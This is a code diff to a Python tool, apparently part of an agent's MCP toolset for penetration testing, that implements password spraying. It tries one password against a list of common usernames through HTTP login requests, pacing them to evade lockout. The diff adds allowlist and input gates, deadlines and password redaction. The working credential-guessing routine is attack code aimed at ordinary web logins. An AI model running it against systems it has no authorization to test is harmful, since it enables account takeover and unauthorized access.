-    def password_spray(target_ip: str, port: int = 80, password: str = "Password1") -> str:
-        """Spray one password across many common usernames. Low-and-slow to avoid account lockout. Use for initial access when you have no valid credentials."""
-        if not target_ip or not target_ip.strip():
-            return "BLOCKED: target_ip is required."
+    def password_spray(target_ip: str, port: int = 80, password: str = "Password1", timeout: int = 90) -> str:
+        """Spray one password across many common usernames.
 
-        import socket as _sock
+        Args:
+            target_ip: Target host (IP or domain, must be allowlisted).
+            port: Target TCP port (1-65535).
+            password: Password to spray (never echoed back — output shows
+                ``[redacted]``; the value is never length-capped).
+            timeout: Overall tool deadline in seconds (clamped 5-300); the
+                username sweep stops early when it expires.
 
-        result_lines = [f"PASSWORD_SPRAY_RESULTS: {target_ip}:{port}", f"Password: {password}", ""]
+        Returns:
+            PASSWORD_SPRAY_RESULTS envelope with per-user verdicts (usernames
+            only, no password material) and a success summary.
+
+        Gates:
+            Declarative ``@require_allowlist`` on ``target_ip`` (full input);
+            target syntax + CR/LF and port range pre-gates before any socket.
+
+        Side-effects:
+            Network: opens TCP connections to target_ip:port (login POSTs,
+            paced ~1.5s apart to avoid lockout).
+        """
+        tip, err = _check_target(target_ip)
+        if err or tip is None:
+            return err
+        host: str = tip
+        port_num, err = _check_port(port)
+        if err or port_num is None:
+            return err
+        dport: int = port_num
+        deadline = time.monotonic() + _clamp_timeout(timeout)
+
+        host_hdr = _http_host(host)
+        # The sprayed password is secret material: it must never appear in
+        # display output (or the audit-visible result block).
+        result_lines = [f"PASSWORD_SPRAY_RESULTS: {host}:{dport}", "Password: [redacted]", ""]
 
         users = [
             "admin",
@@ -696,15 +1068,23 @@ def register_web_tools(mcp: Any, *, ctx: ToolContext) -> None:
         ]
 
         found = []
+        tried = 0
+        stopped_early = False
         for username in users:
+            if time.monotonic() >= deadline:
+                stopped_early = True
+                break
+            tried += 1
             try:
-                with _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM) as s:
-                    s.settimeout(8)
-                    s.connect((target_ip, port))
+                budget = _sock_budget(8.0, deadline)
+                if budget <= 0:
+                    stopped_early = True
+                    break
+                with _open_connection(host, dport, budget) as s:
                     body = json.dumps({"username": username, "password": password}).encode()
                     req = (
                         f"POST /api/login HTTP/1.0\r\n"
-                        f"Host: {target_ip}\r\n"
+                        f"Host: {host_hdr}\r\n"
                         f"Content-Type: application/json\r\n"
                         f"Content-Length: {len(body)}\r\n"
                         f"\r\n"
@@ -714,17 +1094,21 @@ def register_web_tools(mcp: Any, *, ctx: ToolContext) -> None:
 
                     status_line = resp.split("\r\n")[0] if resp else ""
                     if "200" in status_line or "302" in status_line:
-                        result_lines.append(f"  [+] {username}:{password} — SUCCESS ({status_line[:60]})")
+                        result_lines.append(f"  [+] {username} — SUCCESS ({status_line[:60]})")
                         found.append(username)
                     else:
-                        result_lines.append(f"  [-] {username}:{password} — {status_line[:60]}")
+                        result_lines.append(f"  [-] {username} — {status_line[:60]}")
             except Exception as e:  # ponytail: bare except intentional
                 result_lines.append(f"  [!] {username} — error: {e}")
             time.sleep(1.5)  # Delay to avoid lockout
 
-        if found:
-            result_lines.append(f"\n[+] {len(found)} valid credentials found: {found}")
-        else:
-            result_lines.append("\n[-] No valid credentials found with this password.")
+        if stopped_early:
+            result_lines.append(f"Stopped at tool deadline after {tried}/{len(users)} users.")
+            result_lines.append("")
 
-        return "\n".join(result_lines)
+        if found:
+            result_lines.append(f"[+] {len(found)} valid credentials found: {found}")
+        else:
+            result_lines.append("[-] No valid credentials found with this password.")
+
+        return _finish(result_lines)
